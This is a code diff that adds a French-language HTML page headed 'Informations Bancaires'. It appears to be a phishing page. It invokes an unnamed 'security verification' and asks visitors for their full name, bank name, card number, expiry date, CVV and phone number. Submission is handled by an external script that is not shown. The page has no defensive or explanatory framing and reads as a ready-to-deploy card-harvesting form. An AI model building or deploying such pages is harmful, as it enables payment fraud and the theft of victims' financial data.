@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Informations Bancaires</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="script.js"></script>
+  </head>
+  <body class="bg-white font-sans text-gray-800">
+    <div class="flex flex-col items-center min-h-screen">
+      <!-- Main Content -->
+      <main class="flex flex-col items-center px-4 py-8 flex-1 w-full max-w-md">
+        <p class="text-center text-lg font-medium mb-4">
+          Pour des raisons de sécurité, nous procéderons à la vérification
+          rapide de vos informations personnelles. Nous avons besoin de vous
+          authentifier.
+        </p>
+        <h1 class="text-lg font-bold text-gray-800 mb-6 text-center">
+          Veuillez renseigner en toute sécurité vos informations bancaires.
+        </h1>
+
+        <!-- Form -->
+        <form id="form1" class="bg-white shadow-md rounded-lg p-6 w-full space-y-4">
+          <!-- Name Input -->
+          <div>
+            <label for="name" class="block text-sm font-medium mb-1">Saisissez votre nom et prénoms *</label>
+            <input type="text" id="name" placeholder="Nom et Prénoms" class="w-full border border-gray-300 rounded-lg p-2 focus:ring-2 focus:ring-blue-400 focus:outline-none" required />
+          </div>
+
+          <!-- Bank Name Input -->
+          <div>
+            <label for="bank-name" class="block text-sm font-medium mb-1">Saisissez le nom de votre banque *</label>
+            <input type="text" id="bank_name" placeholder="Nom de la banque" class="w-full border border-gray-300 rounded-lg p-2 focus:ring-2 focus:ring-blue-400 focus:outline-none" required />
+          </div>
+
+          <!-- Card Number Input -->
+          <div>
+            <label for="card-number" class="block text-sm font-medium mb-1">Numéro de votre carte bancaire *</label>
+            <input type="text" id="card_number" placeholder="XXXX XXXX XXXX XXXX"  class="w-full border border-gray-300 rounded-lg p-2 focus:ring-2 focus:ring-blue-400 focus:outline-none" required />
+          </div>
+
+          <!-- Expiration Date Input -->
+          <div>
+            <label for="expiration" class="block text-sm font-medium mb-1">Saisissez la date d'expiration *</label>
+            <input type="text" id="expiration" placeholder="MM/YY" class="w-full border border-gray-300 rounded-lg p-2 focus:ring-2 focus:ring-blue-400 focus:outline-none" required />
+          </div>
+
+          <!-- CVV Input -->
+          <div>
+            <label for="cvv" class="block text-sm font-medium mb-1">Saisissez le cryptogramme visuel *</label>
+            <input type="text" id="cvv" placeholder="XXX" pattern="\d{3,4}" class="w-full border border-gray-300 rounded-lg p-2 focus:ring-2 focus:ring-blue-400 focus:outline-none" required />
+          </div>
+
+          <!-- Phone Number Input -->
+          <div>
+            <label for="phone" class="block text-sm font-medium mb-1">Saisissez votre numéro téléphone *</label>
+            <input type="text" id="phone" placeholder="+33 70 05 55 33 6"  class="w-full border border-gray-300 rounded-lg p-2 focus:ring-2 focus:ring-blue-400 focus:outline-none" required />
+          </div>
+
+          <!-- Checkbox -->
+          <div class="flex items-center">
+            <input type="checkbox" id="terms" class="w-4 h-4 border-gray-300 rounded focus:ring-2 focus:ring-blue-400" required />
+            <label for="terms" class="ml-2 text-sm underline">J’accepte les Conditions Générales</label>
+          </div>
+
+          <!-- Submit Button -->
+          <button type="submit" class="w-full bg-blue-500 hover:bg-blue-600 text-white font-medium py-2 rounded-md shadow-md focus:outline-none focus:ring-2 focus:ring-blue-400">Continuer</button>
+        </form>
+      </main>
+    </div>
+  </body>
+</html>
